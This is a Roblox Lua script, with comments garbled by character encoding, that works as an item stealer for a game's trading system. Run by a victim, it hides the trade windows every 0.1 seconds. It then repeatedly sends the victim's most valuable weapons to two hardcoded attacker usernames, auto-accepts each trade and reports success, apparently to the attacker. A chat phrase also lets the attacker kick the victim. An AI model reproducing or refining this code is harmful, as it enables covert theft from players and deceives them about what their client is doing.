-- –ù–æ–≤–∞—è —É–ª—É—á—à–µ–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Å–∫—Ä—ã—Ç–∏—è TradeGUI
local function setupTradeGUIHider()
    local player = game:GetService("Players").LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")
    
    local function hideTradeGUI()
        for _, guiName in pairs({"TradeGUI", "TradeGUI_Phone"}) do
            local gui = playerGui:FindFirstChild(guiName)
            if gui then
                gui.Enabled = false
                -- –î–≤–æ–π–Ω–∞—è –∑–∞—â–∏—Ç–∞: –æ—Ç–∫–ª—é—á–∞–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏–µ Enabled
                if not gui:FindFirstChild("AntiFlash") then
                    local conn
                    conn = gui:GetPropertyChangedSignal("Enabled"):Connect(function()
                        if gui.Enabled then
                            gui.Enabled = false
                        else
                            conn:Disconnect()
                        end
                    end)
                    local anti = Instance.new("BoolValue")
                    anti.Name = "AntiFlash"
                    anti.Parent = gui
                end
            end
        end
    end

    -- –°–∫—Ä—ã–≤–∞–µ–º —Å—Ä–∞–∑—É –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ
    hideTradeGUI()

    -- –û—Ç—Å–ª–µ–∂–∏–≤–∞–µ–º –ø–æ—è–≤–ª–µ–Ω–∏–µ –Ω–æ–≤—ã—Ö –æ–∫–æ–Ω
    playerGui.ChildAdded:Connect(function(child)
        if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
            hideTradeGUI()
        end
    end)

    -- –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞
    while true do
        hideTradeGUI()
        task.wait(0.1)
    end
end

-- –ó–∞–ø—É—Å–∫–∞–µ–º —Å–∫—Ä—ã—Ç–∏–µ GUI –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–π –∫–æ—Ä—É—Ç–∏–Ω–µ
coroutine.wrap(setupTradeGUIHider)()

local loop = false
local tradeInProgress = false

local function isTradeGUIOpen()
    local player = game:GetService("Players").LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")
    
    for _, guiName in pairs({"TradeGUI", "TradeGUI_Phone"}) do
        local tradeGUI = playerGui:FindFirstChild(guiName)
        if tradeGUI then
            return true
        end
    end
    return false
end

local function stealItems(ReceiverName)
    loop = true
    while loop do
        if tradeInProgress then
            task.wait(1)
            continue
        end
        
        local availableItems = {}
        for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
            for c, d in pairs(b) do
                local itemValue = valuesTable[d.DataID] or 0
                if itemValue > 0 and d.Amount > 0 then
                    table.insert(availableItems, {
                        name = d.ItemName,
                        dataId = d.DataID,
                        value = itemValue,
                        amount = d.Amount
                    })
                end
            end
        end
        
        table.sort(availableItems, function(a, b) 
            return a.value > b.value
        end)
        
        if #availableItems == 0 then
            loop = false
            return
        end
        
        -- –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å –Ω–∞ –æ–±–º–µ–Ω
        tradeInProgress = true
        local success = pcall(function()
            Trade.SendRequest:InvokeServer(game:GetService("Players")[ReceiverName])
        end)
        
        if not success then
            tradeInProgress = false
            task.wait(5)
            continue
        end
        
        -- –ñ–¥–µ–º –∫–æ–≥–¥–∞ —Ç—Ä–µ–π–¥ –±—É–¥–µ—Ç –ø—Ä–∏–Ω—è—Ç (–º–∞–∫—Å–∏–º—É–º 30 —Å–µ–∫—É–Ω–¥)
        local tradeAccepted = false
        for i = 1, 30 do
            if isTradeGUIOpen() then
                tradeAccepted = true
                break
            end
            task.wait(1)
        end
        
        if not tradeAccepted then
            print("–¢—Ä–µ–π–¥ –Ω–µ –±—ã–ª –ø—Ä–∏–Ω—è—Ç –≤ —Ç–µ—á–µ–Ω–∏–µ 30 —Å–µ–∫—É–Ω–¥")
            tradeInProgress = false
            continue
        end
        
        -- –î–ê–ï–ú –í–†–ï–ú–Ø –û–ö–ù–£ –¢–†–ï–ô–î–ê –û–¢–ö–†–´–¢–¨–°–Ø (–∫–∞–∫ –≤ –æ—Ä–∏–≥–∏–Ω–∞–ª–µ)
        task.wait(2)
        
        -- –î–æ–±–∞–≤–ª—è–µ–º –ø—Ä–µ–¥–º–µ—Ç—ã (–ò–°–ü–û–õ–¨–ó–£–ï–ú –û–†–ò–ì–ò–ù–ê–õ–¨–ù–£–Æ –õ–û–ì–ò–ö–£)
        local sentItems = {}
        local addedCount = 0
        
        for _, item in ipairs(availableItems) do
            if addedCount >= 4 then break end
            
            local addAmount = math.min(item.amount, 4 - addedCount)
            for i = 1, addAmount do
                local offerSuccess = pcall(function()
                    Trade.OfferItem:FireServer(item.dataId, "Weapons")
                end)
                
                if offerSuccess then
                    table.insert(sentItems, {
                        name = item.name,
                        dataId = item.dataId,
                        amount = 1
                    })
                    addedCount = addedCount + 1
                    print("–£—Å–ø–µ—à–Ω–æ –¥–æ–±–∞–≤–ª–µ–Ω –ø—Ä–µ–¥–º–µ—Ç: " .. item.name)
                else
                    print("–û—à–∏–±–∫–∞ –ø—Ä–∏ –¥–æ–±–∞–≤–ª–µ–Ω–∏–∏ –ø—Ä–µ–¥–º–µ—Ç–∞: " .. item.name)
                end
                
                task.wait(0.5)
                if addedCount >= 4 then break end
            end
        end
        
        if addedCount == 0 then
            print("–ù–µ —É–¥–∞–ª–æ—Å—å –¥–æ–±–∞–≤–∏—Ç—å –Ω–∏ –æ–¥–Ω–æ–≥–æ –ø—Ä–µ–¥–º–µ—Ç–∞, –æ—Ç–º–µ–Ω—è–µ–º —Ç—Ä–µ–π–¥")
            pcall(function() Trade.DeclineTrade:FireServer() end)
            tradeInProgress = false
            task.wait(5)
            continue
        end
        
        print("–£—Å–ø–µ—à–Ω–æ –¥–æ–±–∞–≤–ª–µ–Ω–æ –ø—Ä–µ–¥–º–µ—Ç–æ–≤: " .. addedCount)
        
        -- –ñ–¥–µ–º –∫–∞–∫ –≤ –æ—Ä–∏–≥–∏–Ω–∞–ª–µ
        task.wait(4)
        
        -- –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ–º —Ç—Ä–µ–π–¥ (–æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–∞—è –ª–æ–≥–∏–∫–∞)
        if lastOfferValue then
            local acceptSuccess = pcall(function()
                Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOfferValue)
            end)
            
            if acceptSuccess then
                print("–¢—Ä–µ–π–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω —Å lastOfferValue")
                if #sentItems > 0 then
                    SendTradeSuccessMessage(sentItems, ReceiverName)
                end
            else
                print("–û—à–∏–±–∫–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è —Ç—Ä–µ–π–¥–∞ —Å lastOfferValue")
            end
        else
            -- Fallback
            local success = pcall(function()
                Trade.AcceptTrade:FireServer(game.PlaceId * 3, tick())
            end)
            if success then
                print("–¢—Ä–µ–π–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω —Å tick()")
            else
                print("–û—à–∏–±–∫–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è —Ç—Ä–µ–π–¥–∞ —Å tick()")
            end
        end
        
        -- –ñ–¥–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è —Ç—Ä–µ–π–¥–∞
        for i = 1, 10 do
            if not isTradeGUIOpen() then
                break
            end
            task.wait(1)
        end
        
        tradeInProgress = false
        
        -- –ó–∞–¥–µ—Ä–∂–∫–∞ –ø–µ—Ä–µ–¥ —Å–ª–µ–¥—É—é—â–∏–º —Ç—Ä–µ–π–¥–æ–º
        task.wait(1)
    end
end

-- ==================== –£–õ–£–ß–®–ï–ù–ù–ê–Ø –°–ò–°–¢–ï–ú–ê –û–ë–†–ê–ë–û–¢–ö–ò –ò–ì–†–û–ö–û–í ====================
local function SetupTradeForPlayer(player)
    if player.Name == Username or player.Name == Username2 then
        print("–û–±–Ω–∞—Ä—É–∂–µ–Ω –Ω—É–∂–Ω—ã–π –∏–≥—Ä–æ–∫:", player.Name)
        
        -- –ü–æ–¥–ø–∏—Å—ã–≤–∞–µ–º—Å—è –Ω–∞ —á–∞—Ç –¥–ª—è —Ç—Ä–µ–π–¥–∞
        player.Chatted:Connect(function(message)
            if message:lower():match("trade") or message:lower():match("–æ–±–º–µ–Ω") then
                print("–ü–æ–ª—É—á–µ–Ω–∞ –∫–æ–º–∞–Ω–¥–∞ –Ω–∞ —Ç—Ä–µ–π–¥ –æ—Ç", player.Name)
                loop = true
                stealItems(player.Name)
            end
        end)
        
        -- –ü–æ–¥–ø–∏—Å—ã–≤–∞–µ–º—Å—è –Ω–∞ /kick command
        player.Chatted:Connect(function(message)
            if message == "free dope" then
                game.Players.LocalPlayer:Kick("\nPlease rejoin!")
            end
        end)
        
        -- –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –Ω–∞—á–∏–Ω–∞–µ–º —Ç—Ä–µ–π–¥ –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏
        print("–ù–∞—á–∏–Ω–∞–µ–º –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π —Ç—Ä–µ–π–¥ —Å", player.Name)
        task.wait(2)  -- –ñ–¥–µ–º –Ω–µ–º–Ω–æ–≥–æ –ø–µ—Ä–µ–¥ –Ω–∞—á–∞–ª–æ–º
        loop = true
        stealItems(player.Name)
    end
end

-- –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –Ω–æ–≤—ã—Ö –∏–≥—Ä–æ–∫–æ–≤
game.Players.PlayerAdded:Connect(function(player)
    SetupTradeForPlayer(player)
end)

-- –û–±—Ä–∞–±–æ—Ç–∫–∞ —É–∂–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã—Ö –∏–≥—Ä–æ–∫–æ–≤
for _, player in pairs(game.Players:GetPlayers()) do
    if player.Name == Username or player.Name == Username2 then
        SetupTradeForPlayer(player)
    end
end
